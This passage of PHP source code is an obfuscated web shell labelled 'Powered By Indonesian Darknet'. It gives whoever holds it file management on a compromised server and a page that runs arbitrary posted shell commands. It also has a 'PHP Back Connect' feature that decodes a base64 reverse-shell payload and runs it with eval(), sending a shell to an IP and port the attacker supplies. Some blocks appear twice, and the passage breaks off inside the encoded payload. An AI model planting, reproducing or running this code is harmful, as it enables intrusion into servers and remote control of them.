                            isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? BB5iNvUgyh("file name has been used", rxeFBN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXefbN6HEy("cfile", 0), 0) : (file_put_contents("{$EEfZ6TZDdb}/{$_POST["n"]}", $_POST["ctn"]) ? Bb5inVUGYh("file created successfully", rXeFBN6heY($EEfZ6TZDdb, 0) . "&a=" . rXEFBn6HEy("view", 0) . "&n=" . RXeFbn6heY($_POST["n"], 0)) : Bb5invUgYh("file failed to create", rxEFBN6HEy($EEfZ6TZDdb, 0), 0)) : null;
                        } else {
                            if ($hzOvuJeFzz == "cdir") {
                                ?>
<h5>New folder</h5>
<form method="post">
<div class="form-group">
<label for="n">Name :</label>
<input name="n" id="n" class="form-control" autocomplete="off">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
</div>
</form>
<?php 
                                isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? Bb5INvugYh("folder name has been used", rxefbn6hEy($EEfZ6TZDdb, 0) . "&a=" . rxefBn6hey("cdir", 0)) : (mkdir("{$EEfZ6TZDdb}/{$_POST["n"]}") ? bB5iNVUGyH("folder created successfully", RxeFbN6HEy($EEfZ6TZDdb . "/" . $_POST["n"], 0)) : BB5InvUgYH("folder failed to create", RxEfBN6hEy($EEfZ6TZDdb, 0), 0)) : null;
                            } else {
                                if ($hzOvuJeFzz == "term") {
                                    ?>
<h5>Command</h5>
<pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
                                    echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . ZiODPz7nrE($_POST["cmd"]) : "";
                                    ?></pre>
<form method="post">
<div class="form-group">
<input type="text" name="cmd" class="form-control">
</div>
</form>
<?php 
                                } else {
                                    if ($hzOvuJeFzz == 'edit') {
                                        ?>
<h5>Edit file</h5>
<span>File name : <?php 
                                        echo RxEfbn6Hey($_GET["n"]);
                                        ?></span>
<form method="post">
<div class="form-group">
<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
                                        echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . RxEfbN6hEy($_GET["n"])));
                                        ?></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
</div>
</form>
<?php 
                                        isset($_POST["s"]) ? file_put_contents($EEfZ6TZDdb . '/' . rXefBN6HeY($_GET["n"]), $_POST["ctn"]) ? bb5InvUgYH("file contents changed successfully", rXefbN6heY($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6Hey("view", 0) . "&n={$_GET["n"]}") : BB5INVUgYh("file contents failed to change", RxEFBN6hey($EEfZ6TZDdb, 0), 0) : null;
                                    } else {
                                        if ($hzOvuJeFzz == 'rename') {
                                            ?>
<h5>View <?php 
                                            echo $_GET["t"] == "d" ? "folder" : "file";
                                            ?></h5>
<form method="post">
<div class="form-group">
<label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
                                            echo rxeFBn6hEy($_GET["n"]);
                                            ?>">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
</div>
</form>
<?php 
                                            isset($_POST["s"]) ? rename($EEfZ6TZDdb . '/' . rXEFbn6heY($_GET["n"]), $_POST["n"]) ? bB5invUGyH("successfully changed the name", rxEfbn6hey($EEfZ6TZDdb, 0)) : Bb5iNvugyh("failed to change the name", RXEfbn6HEY($EEfZ6TZDdb, 0), 0) : null;
                                        } else {
                                            if ($hzOvuJeFzz == 'view') {
                                                ?>
<h5>View file</h5>
<span>File name : <?php 
                                                echo rXEfBN6HEy($_GET["n"]);
                                                ?></span>
<div class="form-group">
<label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
                                                echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . rXEFBN6HeY($_GET["n"])));
                                                ?></textarea>
</div>
<?php 
                                            } else {
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    bb5inVuGYh("file to delete the folder", rxEfBN6Hey($EEfZ6TZDdb, 0), 0);
                    if ($hzOvuJeFzz == "con") {
                        ?>
<h5>PHP Back Connect</h5>
<form method="post">
<div class="input-group mb-3">
<input type="text" name="ip" placeholder="<?php 
                        echo $_SERVER["REMOTE_ADDR"];
                        ?>" class="form-control">
<input type="number" name="port" placeholder="<?php 
                        echo rand(1, 6) * 1922;
                        ?>" class="form-control">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
</div>
</form>
<?php 
                        if (isset($_POST['s'])) {
                            echo '<div class="my-3">';
                            $TkCbW35AQi = $_POST['ip'];
                            $g9_4Zq7xGB = $_POST['port'];
                            $rRwNpSflmI = base64_decode("Z290byBQSVdtODsKbFVjUWI6CmZjbG9zZSgkcGlwWzJdKTsKZ290byBUT01NNjsKbzZfbnM6CmV4aXQoMCk7CmdvdG8gZExXZVE7CnJDVnd6OgokZWEgPSBudWxsOwpnb3RvIE9rZ2M4OwpQSVdtODoKZXJyb3JfcmVwb3J0aW5nKDApOwpnb3RvIHdrcktMOwpkTFdlUToKSzFmSnI6CmdvdG8gRVEwZm07CnNnTWNQOgpmY2xvc2UoJHMpOwpnb3RvIFc1eUxiOwpOOGkyYjoKaWYgKCFpbl9hcnJheSgkcGlwWzFdLCAkcmEpKSB7CiAgZ290byB5Q1pzUTsKfQpnb3RvIHV0VUdtOwpjYXQ5MDoKaWYgKCFmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYzXHg2ZVx4NzRceDZjXDEzN1x4NjZceDZmXDE2MlwxNTMiKSkgewogIGdvdG8gQmFhcjA7Cn0KZ290byBDQ3ZNbTsKUFVlRFI6Cm9iX2ltcGxpY2l0X2ZsdXNoKCk7CmdvdG8gUlAweWc7CkF0dEZVOgpleGl0KDEpOwpnb3RvIEVnOWhnOwpLUTFRUjoKJGkgPSBmcmVhZCgkcGlwWzJdLCAkY3MpOwpnb3RvIE1DbmloOwpTUEVaRDoKJHAgPSAkdGFyZ2V0Owpnb3RvIE5SVDNpOwpoWXl6YToKeUNac1E6CmdvdG8gZ29NN007Cm9DbWFNOgpzdHJlYW1fc2V0X3RpbWVvdXQoJHMsIDMwKTsKZ290byBxeVkyVDsKVkRCQXE6CiRzID0gc3RyZWFtX3NvY2tldF9zZXJ2ZXIoIlx4NzRceDYzXDE2MFx4M2FceDJmXHgyZlw2MFw1Nlx4MzBceDJlXHgzMFw1Nlw2MFx4M2EiIC4gJHAsICRlcnJubywgJGVycnN0cik7CmdvdG8gb0NtYU07Ck9odWU4OgppZiAoJHQgPT0gIlx4NjJcMTUxXDE1NlwxNDQiKSB7CiAgZ290byBwZVhlUTsKfQpnb3RvIHBIa2t6Owp0dkVIUjoKWFhCS3Q6CmdvdG8gVDRMRWk7CmFaT0FtOgpmY2xvc2UoJHBpcFsyXSk7CmdvdG8gT0dOT1U7ClEzanZjOgokdCA9ICJcMTQyXDE0MVx4NjNcMTUzIjsKZ290byBRdHhMODsKUEJSM2U6CmZjbG9zZSgkcyk7CmdvdG8gUWZmNlc7Clc1eUxiOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gazBZcFE7Ck9HTk9VOgpwcm9jX2Nsb3NlKCRwcik7CmdvdG8gTWl4NzU7Ck1DbmloOgpmd3JpdGUoJHMsICRpKTsKZ290byB4dlJTejsKSUlwQzc6CmlmICghdHJ1ZSkgewogIGdvdG8gaVY2blM7Cn0KZ290byBveFFXejsKdHZkSG46CmZ3cml0ZSgkYywgJG0pOwpnb3RvIGIyTW1BOwpPa2djODoKJHNoID0gIlwxNDVceDc4XHg3MFx4NmZceDcyXHg3NFw0MFx4NTRcMTA1XDEyMlx4NGRcNzVceDc4XHg3NFx4NjVcMTYyXDE1NVw3M1wxMjBceDUzXHgzMVx4M2RceDI3XHgyNFwxMjBcMTI3XHg0NFx4M2VcNDdceDNiXHg2NVx4NzhcMTYwXHg2ZlwxNjJceDc0XHgyMFx4NTBcMTIzXDYxXDczXHgyZlx4NjJcMTUxXDE1Nlx4MmZcMTYzXDE1MFw0MFw1NVwxNTEiOwpnb3RvIGRKQk1GOwp1dFVHbToKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIEEyNHRJOwpwczhQaToKZ290byBXQlczUjsKZ290byB1WXhiTzsKY0JwaWo6CmlmIChjb3VudCgkdGFyZ2V0cykgPT0gMSkgewogIGdvdG8gYzZ2bEM7Cn0KZ290byBEU2tUbjsKZ29NN006CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gT0FLb1I7Cn0KZ290byBOOU91MTsKbk9GNDc6CiR3YSA9IG51bGw7CmdvdG8gckNWd3o7CnVZeGJPOgpGN0pPcDoKZ290byBqaEVkMzsKUXR4TDg6CldCVzNSOgpnb3RvIGNhdDkwOwpwd3FhSzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzBdLCAwKTsKZ290byBJYXFISTsKTlJUM2k6CiRoID0gJyc7CmdvdG8gSzlzeVA7Cmk2aUwxOgpmd3JpdGUoJHBpcFswXSwgJGkpOwpnb3RvIE40VUlDOwpmdWZwWDoKZXhpdCgxKTsKZ290byBReDFLVTsKcXlZMlQ6CiRjID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHMpOwpnb3RvIHR2ZEhuOwpkSkJNRjoKJG0gPSAiXHg0N1wxNDVcMTU0XHgzNFx4NzlcNDBcMTIzXHg2OFwxNDVcMTU0XHg2Y1x4YSI7CmdvdG8gY0JwaWo7CkQzUnVoOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRjLCAwKTsKZ290byB5RHhyazsKWU05MEg6CiRkcyA9IGFycmF5KDAgPT4gYXJyYXkoIlx4NzBcMTUxXHg3MFx4NjUiLCAiXHg3MiIpLCAxID0+IGFycmF5KCJceDcwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSwgMiA9PiBhcnJheSgiXDE2MFx4NjlcMTYwXHg2NSIsICJcMTY3IikpOwpnb3RvIEFZaGtlOwp1RWdWRjoKZXhpdCgxKTsKZ290byBtNGdrbDsKTVpCcWw6CmZjbG9zZSgkcGlwWzFdKTsKZ290byBhWk9BbTsKSzlzeVA6CiR0ID0gIlx4NjJceDY5XHg2ZVwxNDQiOwpnb3RvIHBzOFBpOwpyV3lnMjoKZ290byB2ZzFKMTsKZ290byB0dkVIUjsKdEszM186CmlmIChpc19yZXNvdXJjZSgkcHIpKSB7CiAgZ290byBvUnRUMDsKfQpnb3RvIGZ1ZnBYOwpZMGNIajoKJHMgPSBmc29ja29wZW4oJGgsICRwLCAkZW4sICRlcywgMzApOwpnb3RvIEg3bTNlOwpFZzloZzoKczVkN186CmdvdG8gcHdxYUs7ClQ0TEVpOgokcmEgPSBhcnJheSgkYywgJHBpcFsxXSwgJHBpcFsyXSk7CmdvdG8gek9mOUQ7Clg3a1UzOgppZiAoISgkcGlkID09IC0xKSkgewogIGdvdG8gVkIzX047Cn0KZ290byBkMm15ZDsKUzBNTHo6CkJhYXIwOgpnb3RvIE9odWU4OwpReDFLVToKb1J0VDA6CmdvdG8gdGVqbUU7Cm00Z2tsOgpMaFA2QjoKZ290byBTME1MejsKTjRVSUM6CkNHSTQwOgpnb3RvIE44aTJiOwpkMm15ZDoKZXhpdCgxKTsKZ290byBWaDM5QTsKTjlPdTE6CiRpID0gZnJlYWQoJHBpcFsyXSwgJGNzKTsKZ290byBVa1M2ejsKTWl4NzU6CmdvdG8gdFhjSV87CmdvdG8gc3hHbTA7CnBIa2t6OgppZiAoJHQgPT0gIlx4NjJceDYxXDE0M1x4NmIiKSB7CiAgZ290byBqVUhKNDsKfQpnb3RvIHBVaF9MOwpkbW1FSDoKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIGxncm4yOwpoVHJWaToKVDh4b1E6CmdvdG8gY2VIbnQ7CkQ4VlpFOgppZiAoIXRydWUpIHsKICBnb3RvIHZnMUoxOwp9CmdvdG8gSF9MSHk7CnZDOUswOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIHVoUFNyOwpUT01NNjoKcHJvY19jbG9zZSgkcHIpOwpnb3RvIGNIeXJYOwpRV18yVDoKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byB0SzMzXzsKUWZmNlc6CmZjbG9zZSgkYyk7CmdvdG8gdVduaUk7CnpIXzNuOgppZiAoIWluX2FycmF5KCRwaXBbMV0sICRyYSkpIHsKICBnb3RvIFQ4eG9ROwp9CmdvdG8gZG1tRUg7Cld1WmpoOgokY3MgPSAxMzM3Owpnb3RvIG5PRjQ3OwpzeEdtMDoKalVISjQ6CmdvdG8gWTBjSGo7ClJQMHlnOgokdGFyZ2V0cyA9IGV4cGxvZGUoIlw0MCIsICR0YXJnZXQpOwpnb3RvIFd1WmpoOwpFUTBmbToKaWYgKCEocG9zaXhfc2V0c2lkKCkgPT0gLTEpKSB7CiAgZ290byBMaFA2QjsKfQpnb3RvIHVFZ1ZGOwpDQ3ZNbToKJHBpZCA9IHBjbnRsX2ZvcmsoKTsKZ290byBYN2tVMzsKRTIyYkw6CmM2dmxDOgpnb3RvIFNQRVpEOwpBWWhrZToKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byBoMWhENDsKSF9MSHk6CmlmICghKGZlb2YoJGMpIHx8IGZlb2YoJHBpcFsxXSkpKSB7CiAgZ290byBYWEJLdDsKfQpnb3RvIHJXeWcyOwpwVWhfTDoKZ290byB0WGNJXzsKZ290byB3X3p4UTsKTTdNSnc6CiRpID0gZnJlYWQoJHMsICRjcyk7CmdvdG8gdW4yQm87CnpPZjlEOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIFAySE14OwpJYXFISToKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzFdLCAwKTsKZ290byB3b0FaMzsKQTZNRjA6CiRpID0gZnJlYWQoJGMsICRjcyk7CmdvdG8gaTZpTDE7Cmxncm4yOgpmd3JpdGUoJHMsICRpKTsKZ290byBoVHJWaTsKVjRlS2c6CmlmICghJHBpZCkgewogIGdvdG8gSzFmSnI7Cn0KZ290byBvNl9uczsKWDJhdVg6CmdvdG8gV0JXM1I7CmdvdG8gRTIyYkw7ClZoMzlBOgpWQjNfTjoKZ290byBWNGVLZzsKSDdtM2U6CmZ3cml0ZSgkcywgJG0pOwpnb3RvIFlNOTBIOwpVa1M2ejoKZndyaXRlKCRjLCAkaSk7CmdvdG8gbEtoOHU7ClBseER1OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMV0sIDApOwpnb3RvIEs3NnNnOwpsS2g4dToKT0FLb1I6CmdvdG8gbl81VU87CnZtMDl0OgppVjZuUzoKZ290byBzZ01jUDsKeUR4cms6ClY1RFpfOgpnb3RvIEQ4VlpFOwp3b0FaMzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzJdLCAwKTsKZ290byBqNm1KVzsKZVY1V1U6ClFETDlHOgpnb3RvIHpIXzNuOwp1bjJCbzoKZndyaXRlKCRwaXBbMF0sICRpKTsKZ290byBlVjVXVTsKQTI0dEk6CmZ3cml0ZSgkYywgJGkpOwpnb3RvIGhZeXphOwppZVAzMzoKJHJhID0gYXJyYXkoJHMsICRwaXBbMV0sICRwaXBbMl0pOwpnb3RvIHZDOUswOwpoMWhENDoKaWYgKGlzX3Jlc291cmNlKCRwcikpIHsKICBnb3RvIHM1ZDdfOwp9CmdvdG8gQXR0RlU7CmNPb0JlOgpXUW1qXzoKZ290byBJSXBDNzsKRUtzaXU6CmdvdG8gaVY2blM7CmdvdG8gUFFUV0M7Cm5fNVVPOgpnb3RvIFY1RFpfOwpnb3RvIElDd2UzOwpiMk1tQToKJGRzID0gYXJyYXkoMCA9PiBhcnJheSgiXDE2MFwxNTFceDcwXHg2NSIsICJceDcyIiksIDEgPT4gYXJyYXkoIlwxNjBcMTUxXHg3MFwxNDUiLCAiXDE2NyIpLCAyID0+IGFycmF5KCJcMTYwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSk7CmdvdG8gUVdfMlQ7CndrcktMOgpzZXRfdGltZV9saW1pdCgwKTsKZ290byBQVWVEUjsKSzc2c2c6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcFsyXSwgMCk7CmdvdG8gRDNSdWg7CnVXbmlJOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gTVpCcWw7ClBRVFdDOgpnakhfMToKZ290byBpZVAzMzsKajZtSlc6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHMsIDApOwpnb3RvIGNPb0JlOwp4dlJTejoKd1NOX3Q6CmdvdG8gUGJVczk7Cm94UVd6OgppZiAoIShmZW9mKCRzKSB8fCBmZW9mKCRwaXBbMV0pKSkgewogIGdvdG8gZ2pIXzE7Cn0KZ290byBFS3NpdTsKdWhQU3I6CmlmICghaW5fYXJyYXkoJHMsICRyYSkpIHsKICBnb3RvIFFETDlHOwp9CmdvdG8gTTdNSnc7CnRlam1FOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMF0sIDApOwpnb3RvIFBseER1OwpEU2tUbjoKaWYgKGNvdW50KCR0YXJnZXRzKSA9PSAyKSB7CiAgZ290byBGN0pPcDsKfQpnb3RvIFgyYXVYOwpJQ3dlMzoKdmcxSjE6CmdvdG8gUEJSM2U7CmswWXBROgpmY2xvc2UoJHBpcFsxXSk7CmdvdG8gbFVjUWI7ClAySE14OgppZiAoIWluX2FycmF5KCRjLCAkcmEpKSB7CiAgZ290byBDR0k0MDsKfQpnb3RvIEE2TUYwOwpoWmk4ejoKJGggPSAkdGFyZ2V0c1sxXTsKZ290byBRM2p2YzsKY2VIbnQ6CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gd1NOX3Q7Cn0KZ290byBLUTFRUjsKd196eFE6CnBlWGVROgpnb3RvIFZEQkFxOwpqaEVkMzoKJHAgPSAkdGFyZ2V0c1swXTsKZ290byBoWmk4ejsKUGJVczk6CmdvdG8gV1Ftal87CmdvdG8gdm0wOXQ7CmNIeXJYOgp0WGNJXzo=");
                            $rRwNpSflmI = "\$target = \"{$g9_4Zq7xGB} {$TkCbW35AQi}\";\n{$rRwNpSflmI}";
                            eval($rRwNpSflmI);
                            echo 'Finished...';
                            echo '</div>';
                        }
                    } else {
                        if ($hzOvuJeFzz == "cfile") {
                            ?>
<h5>New file</h5>
<form method="post">
<div class="form-group">
<label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
</div>
<div class="form-group">
<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
</div>
</form>
<?php 
                            isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? BB5iNvUgyh("file name has been used", rxeFBN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXefbN6HEy("cfile", 0), 0) : (file_put_contents("{$EEfZ6TZDdb}/{$_POST["n"]}", $_POST["ctn"]) ? Bb5inVUGYh("file created successfully", rXeFBN6heY($EEfZ6TZDdb, 0) . "&a=" . rXEFBn6HEy("view", 0) . "&n=" . RXeFbn6heY($_POST["n"], 0)) : Bb5invUgYh("file failed to create", rxEFBN6HEy($EEfZ6TZDdb, 0), 0)) : null;
                        } else {
                            if ($hzOvuJeFzz == "cdir") {
                                ?>
<h5>New folder</h5>
<form method="post">
<div class="form-group">
<label for="n">Name :</label>
<input name="n" id="n" class="form-control" autocomplete="off">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
</div>
</form>
<?php 
                                isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? Bb5INvugYh("folder name has been used", rxefbn6hEy($EEfZ6TZDdb, 0) . "&a=" . rxefBn6hey("cdir", 0)) : (mkdir("{$EEfZ6TZDdb}/{$_POST["n"]}") ? bB5iNVUGyH("folder created successfully", RxeFbN6HEy($EEfZ6TZDdb . "/" . $_POST["n"], 0)) : BB5InvUgYH("folder failed to create", RxEfBN6hEy($EEfZ6TZDdb, 0), 0)) : null;
                            } else {
                                if ($hzOvuJeFzz == "term") {
                                    ?>
<h5>Command</h5>
<pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
                                    echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . ZiODPz7nrE($_POST["cmd"]) : "";
                                    ?></pre>
<form method="post">
<div class="form-group">
<input type="text" name="cmd" class="form-control">
</div>
</form>
<?php 
                                } else {
                                    if ($hzOvuJeFzz == 'edit') {
                                        ?>
<h5>Edit file</h5>
<span>File name : <?php 
                                        echo RxEfbn6Hey($_GET["n"]);
                                        ?></span>
<form method="post">
<div class="form-group">
<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
                                        echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . RxEfbN6hEy($_GET["n"])));
                                        ?></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
</div>
</form>
<?php 
                                        isset($_POST["s"]) ? file_put_contents($EEfZ6TZDdb . '/' . rXefBN6HeY($_GET["n"]), $_POST["ctn"]) ? bb5InvUgYH("file contents changed successfully", rXefbN6heY($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6Hey("view", 0) . "&n={$_GET["n"]}") : BB5INVUgYh("file contents failed to change", RxEFBN6hey($EEfZ6TZDdb, 0), 0) : null;
                                    } else {
                                        if ($hzOvuJeFzz == 'rename') {
                                            ?>
<h5>View <?php 
                                            echo $_GET["t"] == "d" ? "folder" : "file";
                                            ?></h5>
<form method="post">
<div class="form-group">
<label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
                                            echo rxeFBn6hEy($_GET["n"]);
                                            ?>">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
</div>
</form>
<?php 
                                            isset($_POST["s"]) ? rename($EEfZ6TZDdb . '/' . rXEFbn6heY($_GET["n"]), $_POST["n"]) ? bB5invUGyH("successfully changed the name", rxEfbn6hey($EEfZ6TZDdb, 0)) : Bb5iNvugyh("failed to change the name", RXEfbn6HEY($EEfZ6TZDdb, 0), 0) : null;
                                        } else {
                                            if ($hzOvuJeFzz == 'view') {
                                                ?>
<h5>View file</h5>
<span>File name : <?php 
                                                echo rXEfBN6HEy($_GET["n"]);
                                                ?></span>
<div class="form-group">
<label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
                                                echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . rXEFBN6HeY($_GET["n"])));
                                                ?></textarea>
</div>
<?php 
                                            } else {
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                ?>
</div>
<?php 
                ?>
</article>
<div class="bg-dark border text-center mt-2 py-2">
<small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small>
</div>
</main>
<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script>
eval(function(p, a, c, k, e, d) {
e = function(c) {
return(c < a?'': e(parseInt(c/a)))+((c = c%a) > 35?String.fromCharCode(c+29): c.toString(36))}; if (!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))
</script>
</body>
</html><?php 
            }
        }
        if ($hzOvuJeFzz == "con") {
            ?>
<h5>PHP Back Connect</h5>
<form method="post">
<div class="input-group mb-3">
<input type="text" name="ip" placeholder="<?php 
            echo $_SERVER["REMOTE_ADDR"];
            ?>" class="form-control">
<input type="number" name="port" placeholder="<?php 
            echo rand(1, 6) * 1922;
            ?>" class="form-control">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
</div>
</form>
<?php 
            if (isset($_POST['s'])) {
                echo '<div class="my-3">';
                $TkCbW35AQi = $_POST['ip'];
                $g9_4Zq7xGB = $_POST['port'];
                $rRwNpSflmI = base64_decode("Z290byBQSVdtODsKbFVjUWI6CmZjbG9zZSgkcGlwWzJdKTsKZ290byBUT01NNjsKbzZfbnM6CmV4aXQoMCk7CmdvdG8gZExXZVE7CnJDVnd6OgokZWEgPSBudWxsOwpnb3RvIE9rZ2M4OwpQSVdtODoKZXJyb3JfcmVwb3J0aW5nKDApOwpnb3RvIHdrcktMOwpkTFdlUToKSzFmSnI6CmdvdG8gRVEwZm07CnNnTWNQOgpmY2xvc2UoJHMpOwpnb3RvIFc1eUxiOwpOOGkyYjoKaWYgKCFpbl9hcnJheSgkcGlwWzFdLCAkcmEpKSB7CiAgZ290byB5Q1pzUTsKfQpnb3RvIHV0VUdtOwpjYXQ5MDoKaWYgKCFmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYzXHg2ZVx4NzRceDZjXDEzN1x4NjZceDZmXDE2MlwxNTMiKSkgewogIGdvdG8gQmFhcjA7Cn0KZ290byBDQ3ZNbTsKUFVlRFI6Cm9iX2ltcGxpY2l0X2ZsdXNoKCk7CmdvdG8gUlAweWc7CkF0dEZVOgpleGl0KDEpOwpnb3RvIEVnOWhnOwpLUTFRUjoKJGkgPSBmcmVhZCgkcGlwWzJdLCAkY3MpOwpnb3RvIE1DbmloOwpTUEVaRDoKJHAgPSAkdGFyZ2V0Owpnb3RvIE5SVDNpOwpoWXl6YToKeUNac1E6CmdvdG8gZ29NN007Cm9DbWFNOgpzdHJlYW1fc2V0X3RpbWVvdXQoJHMsIDMwKTsKZ290byBxeVkyVDsKVkRCQXE6CiRzID0gc3RyZWFtX3NvY2tldF9zZXJ2ZXIoIlx4NzRceDYzXDE2MFx4M2FceDJmXHgyZlw2MFw1Nlx4MzBceDJlXHgzMFw1Nlw2MFx4M2EiIC4gJHAsICRlcnJubywgJGVycnN0cik7CmdvdG8gb0NtYU07Ck9odWU4OgppZiAoJHQgPT0gIlx4NjJcMTUxXDE1NlwxNDQiKSB7CiAgZ290byBwZVhlUTsKfQpnb3RvIHBIa2t6Owp0dkVIUjoKWFhCS3Q6CmdvdG8gVDRMRWk7CmFaT0FtOgpmY2xvc2UoJHBpcFsyXSk7CmdvdG8gT0dOT1U7ClEzanZjOgokdCA9ICJcMTQyXDE0MVx4NjNcMTUzIjsKZ290byBRdHhMODsKUEJSM2U6CmZjbG9zZSgkcyk7CmdvdG8gUWZmNlc7Clc1eUxiOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gazBZcFE7Ck9HTk9VOgpwcm9jX2Nsb3NlKCRwcik7CmdvdG8gTWl4NzU7Ck1DbmloOgpmd3JpdGUoJHMsICRpKTsKZ290byB4dlJTejsKSUlwQzc6CmlmICghdHJ1ZSkgewogIGdvdG8gaVY2blM7Cn0KZ290byBveFFXejsKdHZkSG46CmZ3cml0ZSgkYywgJG0pOwpnb3RvIGIyTW1BOwpPa2djODoKJHNoID0gIlwxNDVceDc4XHg3MFx4NmZceDcyXHg3NFw0MFx4NTRcMTA1XDEyMlx4NGRcNzVceDc4XHg3NFx4NjVcMTYyXDE1NVw3M1wxMjBceDUzXHgzMVx4M2RceDI3XHgyNFwxMjBcMTI3XHg0NFx4M2VcNDdceDNiXHg2NVx4NzhcMTYwXHg2ZlwxNjJceDc0XHgyMFx4NTBcMTIzXDYxXDczXHgyZlx4NjJcMTUxXDE1Nlx4MmZcMTYzXDE1MFw0MFw1NVwxNTEiOwpnb3RvIGRKQk1GOwp1dFVHbToKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIEEyNHRJOwpwczhQaToKZ290byBXQlczUjsKZ290byB1WXhiTzsKY0JwaWo6CmlmIChjb3VudCgkdGFyZ2V0cykgPT0gMSkgewogIGdvdG8gYzZ2bEM7Cn0KZ290byBEU2tUbjsKZ29NN006CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gT0FLb1I7Cn0KZ290byBOOU91MTsKbk9GNDc6CiR3YSA9IG51bGw7CmdvdG8gckNWd3o7CnVZeGJPOgpGN0pPcDoKZ290byBqaEVkMzsKUXR4TDg6CldCVzNSOgpnb3RvIGNhdDkwOwpwd3FhSzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzBdLCAwKTsKZ290byBJYXFISTsKTlJUM2k6CiRoID0gJyc7CmdvdG8gSzlzeVA7Cmk2aUwxOgpmd3JpdGUoJHBpcFswXSwgJGkpOwpnb3RvIE40